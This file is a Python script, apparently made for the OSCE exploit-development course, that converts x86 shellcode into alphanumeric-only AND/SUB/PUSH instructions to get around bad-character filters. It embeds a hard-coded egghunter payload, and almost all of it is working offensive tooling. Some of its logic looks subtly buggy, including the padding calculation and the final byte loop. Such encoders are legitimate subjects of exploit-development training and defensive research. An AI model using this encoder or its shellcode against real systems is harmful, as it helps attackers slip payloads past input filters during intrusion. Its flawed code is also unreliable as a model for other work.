#!/usr/bin/env python
# alpha numeric encoder for shellcode using 1 register zerooing it and subtracting only good chars to assemble shellcode on the stack.
# This encoder was made for the OSCE course by 0x90 and B0x41S
# use for testing purposes only

from shellnoob import ShellNoob # used to disassemble asm to hex

sn = ShellNoob(flag_intel=True)

#This is the shellcode we are going to encode and the register we have available to do this
shellcode = (r"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
register = "EAX"

#All possible hex characters
allChar =[0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a,
          0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15,
          0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20,
          0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2a, 0x2b,
          0x2c, 0x2d, 0x2e, 0x2f, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36,
          0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f, 0x40, 0x41,
          0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c,
          0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57,
          0x58, 0x59, 0x5a, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 0x60, 0x61, 0x62,
          0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d,
          0x6e, 0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78,
          0x79, 0x7a, 0x7b, 0x7c, 0x7d, 0x7e, 0x7f, 0x80, 0x81, 0x82, 0x83,
          0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e,
          0x8f, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99,
          0x9a, 0x9b, 0x9c, 0x9d, 0x9e, 0x9f, 0xa0, 0xa1, 0xa2, 0xa3, 0xa4,
          0xa5, 0xa6, 0xa7, 0xa8, 0xa9, 0xaa, 0xab, 0xac, 0xad, 0xae, 0xaf,
          0xb0, 0xb1, 0xb2, 0xb3, 0xb4, 0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba,
          0xbb, 0xbc, 0xbd, 0xbe, 0xbf, 0xc0, 0xc1, 0xc2, 0xc3, 0xc4, 0xc5,
          0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xcb, 0xcc, 0xcd, 0xce, 0xcf, 0xd0,
          0xd1, 0xd2, 0xd3, 0xd4, 0xd5, 0xd6, 0xd7, 0xd8, 0xd9, 0xda, 0xdb,
          0xdc, 0xdd, 0xde, 0xdf, 0xe0, 0xe1, 0xe2, 0xe3, 0xe4, 0xe5, 0xe6,
          0xe7, 0xe8, 0xe9, 0xea, 0xeb, 0xec, 0xed, 0xee, 0xef, 0xf0, 0xf1,
          0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa, 0xfb, 0xfc,
          0xfd, 0xfe, 0xff]

#badchars
badChar=[0x00, 0x0a, 0x0d, 0x0e, 0x2f, 0x3a, 0x3f, 0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
         0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96,
         0x97, 0x98, 0x99, 0x9a, 0x9b, 0x9c, 0x9d, 0x9e, 0x9f, 0xa0, 0xa1, 0xa2, 0xa3, 0xa4, 0xa5,
         0xa6, 0xa7, 0xa8, 0xa9, 0xaa, 0xab, 0xac, 0xad, 0xae, 0xaf, 0xb0, 0xb1, 0xb2, 0xb3, 0xb4,
         0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba, 0xbb, 0xbc, 0xbd, 0xbe, 0xbf, 0xc0, 0xc1, 0xc2, 0xc3,
         0xc4, 0xc5, 0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xcb, 0xcc, 0xcd, 0xce, 0xcf, 0xd0, 0xd1, 0xd2,
         0xd3, 0xd4, 0xd5, 0xd6, 0xd7, 0xd8, 0xd9, 0xda, 0xdb, 0xdc, 0xdd, 0xde, 0xdf, 0xe0, 0xe1,
         0xe2, 0xe3, 0xe4, 0xe5, 0xe6, 0xe7, 0xe8, 0xe9, 0xea, 0xeb, 0xec, 0xed, 0xee, 0xef, 0xf0,
         0xf1, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa, 0xfb, 0xfc, 0xfd, 0xfe, 0xff, 0x40]

#Full alpha numeric range of characters
alphaNumRange = [0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f, 0x40, 0x41, 0x42,
                 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55,
                 0x56, 0x57, 0x58, 0x59, 0x5a, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68,
                 0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a]

def check_len(shell):# a check if the length of the shellcode is divisable in blocks of 4 bytes
    if len(shell) / 4 % 4 != 0:
        NofP = 4 - (len(shell) / 4 % 4 != 0)
        print("Shellcode not divisible by 4 padding with " + str(NofP) + " Nops")
        shell += r"\x90" * NofP
    print("Shellcode is a correct multiple of 4")
    return shell

def remove(shellcode):# remove "' and \x from shellcode to get a hexadecimal string without formatting
    shellcode = shellcode.replace("\\x", "")
    shellcode = shellcode.replace("'", "")
    shellcode = shellcode.replace('"', "")
    return shellcode

def reverse(hexstring):
    hexbyte1 = hexstring[0] + hexstring[1]
    hexbyte2 = hexstring[2] + hexstring[3]
    hexbyte3 = hexstring[4] + hexstring[5]
    hexbyte4 = hexstring[6] + hexstring[7]
    newhex = hexbyte4 + hexbyte3 + hexbyte2 + hexbyte1
    return newhex

def split(hexstring):
    hexbyte1 = hexstring[0] + hexstring[1]
    hexbyte2 = hexstring[2] + hexstring[3]
    hexbyte3 = hexstring[4] + hexstring[5]
    hexbyte4 = hexstring[6] + hexstring[7]
    hexbyte5 = hexstring[8] + hexstring[9]
    return hexbyte2, hexbyte3, hexbyte4, hexbyte5

def calc(hexvalue1, hexvalue2):
    revhex = hexvalue1
    if hexvalue2 == "wrap":
        intofhex = int(revhex, 16)  # Make int to be able to calculate
        zeroMin = 0 - intofhex & 0xFFFFFFFF  # Make the clock go round
        zeroMin = "0x" + hex(zeroMin)[2:].zfill(8)
        return zeroMin
    else:
        intofhex1 = int(hexvalue1, 16)  # Make int to be able to calculate
        intofhex2 = int(hexvalue2, 16)
        diff = intofhex1 - intofhex2 & 0xFF  # Make the clock go round
        diff = "0x" + hex(diff)[2:]
        return diff

def sub(values):
    retvalue = []
    for i in values:
        hex7c = int('0x7c', 16)
        hexchar = int(i, 16)
        if hexchar == 0:
            hexchar += 100
            retvalue += '0x7c', '0x7c', '0x08'
        elif hexchar == 1:
            hexchar += 101
            retvalue += '0x7c', '0x84', '0x01'
        elif hexchar <= hex7c:
            nextsub = '0x01'
            hexchar = hexchar - 0x02  # deze nog aanpassen ivm 0
            hexchar = "0x" + hex(hexchar)[2:].zfill(2)
            retvalue += hexchar, nextsub, nextsub
        elif hexchar >= hex7c * 2:
            remainder = hexchar - (hex7c + hex7c)
            remainder = "0x" + hex(remainder)[2:].zfill(2)
            hex7c = hex(hex7c)
            retvalue += hex7c, hex7c, remainder

        else:
            remainder = hexchar - hex7c - 0x01
            remainder = "0x" + hex(remainder)[2:].zfill(2)
            hex7c = hex(hex7c)
            retvalue += hex7c, remainder, '0x01'

    # This whole piece must be smarter !!
    # In case of a 00 we must change some values
    if values[0] == "00":
        pass  # print("first value")
    if values[1] == "00":
        retvalue[0] = calc(retvalue[0], '0x01')
    if values[2] == "00":
        retvalue[3] = calc(retvalue[3], '0x01')
    if values[3] == "00":
        pass  # print("fourth value")
    if values[3] == "01":
         retvalue[6] = calc(retvalue[6], '0x01')
    return retvalue

def test(chunks):
    intofhex1 = int(chunks[0], 16)
    intofhex2 = int(chunks[1], 16)
    intofhex3 = int(chunks[2], 16)
    test = hex(0 - intofhex1 - intofhex2 - intofhex3 & 0xFFFFFFFF)
    result = "0x" + test[2:].zfill(8)
    return result

def strip(ugly):
    n = 2
    nice = [ugly[index: index + n] for index in range(0, len(ugly), n)]
    nice = "".join(nice[1::2])
    nice = nice.upper()
    return nice

def subtable(retvalue):
    nice = []
    chunk1 = retvalue[0:3][0] + retvalue[3:6][0] + retvalue[6:9][0] + retvalue[9:12][0]
    chunk2 = retvalue[0:3][1] + retvalue[3:6][1] + retvalue[6:9][1] + retvalue[9:12][1]
    chunk3 = retvalue[0:3][2] + retvalue[3:6][2] + retvalue[6:9][2] + retvalue[9:12][2]
    nice.append(strip(chunk1))
    nice.append(strip(chunk2))
    nice.append(strip(chunk3))
    return nice

shellcode = check_len(shellcode)
print(shellcode)
n = 4 * 4

f = open("shellcode.txt", "w")
newshellcode = []
# Cut shellcode in pieces of 4 bytes
shellcode = [shellcode[i:i + n] for i in range(0, len(shellcode), n)]
print("\r\nThese are the chunks we need to encode:")
print("\r\n" + "----------------------------")
for i in shellcode:
    print(i)
print("----------------------------")
print("New instructions in file shellcode.txt")
f.write("#We use register " + register + "\r\n")
f.write("#First zero-out " + register + "\r\n")

newshellcode.append(sn.asm_to_hex('and %eax, 0x554E4D4A'))
f.write("AND " + register + ", 0x554E4D4A" + "\r\n")

newshellcode.append(sn.asm_to_hex('and %eax, 0x2A313235'))
f.write("AND " + register + ", 0x2A313235" + "\r\n")
f.write("#Then set " + register + " to StackPointer" + "\r\n")

newshellcode.append(sn.asm_to_hex('push %esp'))
f.write("PUSH ESP" + "\r\n")

newshellcode.append(sn.asm_to_hex('pop %' + register))
f.write("POP " + register + "\r\n")
f.write("#Then create space on the stack for encoded shellcode, in this case 253 bytes" + "\r\n")

newshellcode.append(sn.asm_to_hex("SUB %" + register + ", 0x55554D66"))
newshellcode.append(sn.asm_to_hex("SUB %" + register + ", 0x55554B66"))
newshellcode.append(sn.asm_to_hex("SUB %" + register + ", 0x5555506A"))
f.write("SUB " + register + ", 0x55554D66" + "\r\n")  # creating space on the stack where the encoded shellcode ends Here 253 bytes but one can only know in the end.
f.write("SUB  " + register + ", 0x55554B66" + "\r\n")
f.write("SUB " + register + ", 0x5555506A" + "\r\n")

newshellcode.append(sn.asm_to_hex('push %' + register))
newshellcode.append(sn.asm_to_hex('pop %esp'))
f.write("PUSH " + register + "\r\n")
f.write("POP ESP" + "\r\n")
f.write("#Now we write the encoded egghunter to the stack" + "\r\n")

for i in shellcode:
    print(i)
    shellcode = str(i)
    loosevalues = []
    hexclean = remove(shellcode)  # Remove slashes etc
    revhex = reverse(hexclean)  # Reverse the string endianess
    print(revhex)
    hexzeroMin = calc(revhex, "wrap")
    print(hexzeroMin)
    loosevalues = split(hexzeroMin)
    chunks = sub(loosevalues)
    print(chunks)
    newchunks = subtable(chunks)
    print(newchunks)
    print("")

    newshellcode.append(sn.asm_to_hex("AND %" + register + ", 0x554E4D4A"))
    newshellcode.append(sn.asm_to_hex("AND %" + register + ", 0x2A313235"))
    newshellcode.append(sn.asm_to_hex("SUB %" + register + ", 0x" + newchunks[0]))
    newshellcode.append(sn.asm_to_hex("SUB %" + register + ", 0x" + newchunks[1]))
    newshellcode.append(sn.asm_to_hex("SUB %" + register + ", 0x" + newchunks[2]))
    newshellcode.append(sn.asm_to_hex("PUSH %" + register))

    f.write("AND " + register + ", 0x554E4D4A" + "\r\n")
    f.write("AND " + register + ", 0x2A313235" + "\r\n")
    f.write("SUB " + register + ", 0x" + newchunks[0] + "\r\n")
    f.write("SUB " + register + ", 0x" + newchunks[1] + "\r\n")
    f.write("SUB " + register + ", 0x" + newchunks[2] + "\r\n")
    f.write("PUSH " + register + "\r\n")

    if not str(test(newchunks)) == str("0x" + revhex):
        print("This is not good ...")
        print("0x" + revhex)
        print(str(test(newchunks)))
        exit()

f.close()
l = "".join(newshellcode)

step = 2
newshellcode = []

while step < len(l):
    hex = "\\x" + str(l[step - 2:step])
    newshellcode.append(hex)
    step += 2

print('\r\nNew Shellcode:\r\nShellcode=("' + "".join(newshellcode) + '")')
